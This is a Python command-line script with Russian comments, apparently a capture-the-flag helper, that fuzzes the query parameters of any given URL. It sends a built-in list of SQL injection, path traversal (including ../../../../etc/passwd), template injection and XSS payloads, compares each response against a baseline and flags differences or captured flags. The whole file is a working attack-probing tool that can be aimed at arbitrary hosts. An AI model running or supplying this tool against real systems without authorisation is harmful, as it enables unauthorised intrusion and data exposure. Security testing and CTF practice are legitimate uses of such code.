#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
param_probe.py — быстрый прогон payload'ов по параметрам URL.

  python param_probe.py "http://host/item?id=1&page=2"
  python param_probe.py "http://host/item?id=1" --param id --methods GET,POST
  python param_probe.py "http://host/item?id=1" --cookie "token=..." --payload-file list.txt

Сравнивает статус/длину/текст с базовым ответом и показывает только отличия.
"""
from __future__ import annotations

# Windows: консоль/pipe не должны падать на Unicode (—, →, «», █).
try:
    import sys as _sys
    for _stream in (_sys.stdout, _sys.stderr):
        _stream.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

import argparse
import hashlib
import os
import sys
import urllib.parse as up

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import common  # noqa: E402

PAYLOADS = [
    "' OR 1=1--", "' OR 1=1-- -", "' OR '1'='1", "' OR '1'='1'--",
    "1' OR '1'='1", "1 OR 1=1", "admin'--", "'", "\"",
    "../", "../../../../etc/passwd", "%2e%2e%2f",
    "{{7*7}}", "${7*7}", "<script>alert(1)</script>",
    "0", "-1", "999999999", "null", "true", "admin", "[]", "{}", "\\", "%00",
]



def fingerprint(resp):
    text = resp.text or ""
    return (resp.status_code, len(text), hashlib.md5(text.encode("utf-8", "replace")).hexdigest())


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url")
    ap.add_argument("--param", help="какой параметр мутировать (по умолчанию все)")
    ap.add_argument("--methods", default="GET")
    ap.add_argument("--cookie")
    ap.add_argument("--header", action="append", default=[])
    ap.add_argument("--payload-file")
    ap.add_argument("--timeout", type=float, default=10)
    ap.add_argument("--show-same", action="store_true")
    args = ap.parse_args()

    payloads = PAYLOADS
    if args.payload_file:
        payloads = [l.rstrip("\n") for l in open(args.payload_file, encoding="utf-8") if l.strip()]

    headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
    if args.cookie:
        headers["Cookie"] = args.cookie

    parsed = up.urlparse(args.url)
    qs = up.parse_qs(parsed.query, keep_blank_values=True)
    params = [args.param] if args.param else list(qs)

    try:
        base = requests.request("GET", args.url, headers=headers, timeout=args.timeout)
    except requests.RequestException as e:
        print("[-] базовый запрос не удался:", e)
        sys.exit(1)
    base_fp = fingerprint(base)
    print(f"[+] база: {base.status_code} len={len(base.text)} params={params}")

    for method in args.methods.split(","):
        method = method.strip().upper()
        for p in params:
            for payload in payloads:
                new_qs = dict(qs)
                new_qs[p] = [qs[p][0] + payload if p in qs and qs[p] else payload]
                query = up.urlencode(new_qs, doseq=True)
                url = up.urlunparse(parsed._replace(query=query))
                try:
                    if method == "GET":
                        r = requests.get(url, headers=headers, timeout=args.timeout)
                    else:
                        r = requests.request(method, url, headers=headers,
                                             data={p: payload}, timeout=args.timeout)
                except requests.RequestException as e:
                    print(f"[!] {method} {p}={payload!r}: {e}")
                    continue
                fp = fingerprint(r)
                flags = common.find_flags((r.text or "").encode("utf-8", "replace"))
                if flags:
                    print(f"[!!!] ФЛАГ {method} {p}={payload!r}: {' | '.join(flags)}")
                if fp != base_fp or args.show_same:
                    mark = "!!" if fp[0] != base_fp[0] else " ~"
                    print(f"{mark} {method} {p}={payload!r} -> {fp[0]} len={fp[1]}")


if __name__ == "__main__":
    main()
